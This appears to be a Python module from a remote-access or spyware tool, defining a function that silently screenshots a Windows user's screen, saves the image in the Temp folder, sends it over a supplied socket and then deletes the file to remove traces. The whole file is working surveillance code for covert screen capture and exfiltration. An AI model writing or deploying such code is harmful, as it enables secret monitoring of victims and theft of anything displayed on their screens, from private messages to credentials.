from PIL import ImageGrab
import os
import subprocess
import getpass

#Script to take screenshot, to work with the ange

def printscr(s):
	username = getpass.getuser()
	savedir=(r'C:\Users\%s\AppData\Local\Temp' % username)
	save_as = os.path.join(savedir, 'data.png')
	img = ImageGrab.grab()
	img.save(save_as)
	image = open(os.path.join(save_as), "rb")
	image_data = image.read()
	image.close()
	header = ""
	header_bytes = bytes(header, "utf-8")
	s.sendall(header_bytes + image_data)
	subprocess.call(r"DEL C:\Users\%s\AppData\Local\Temp\data.png" % username, shell=True)

	
	

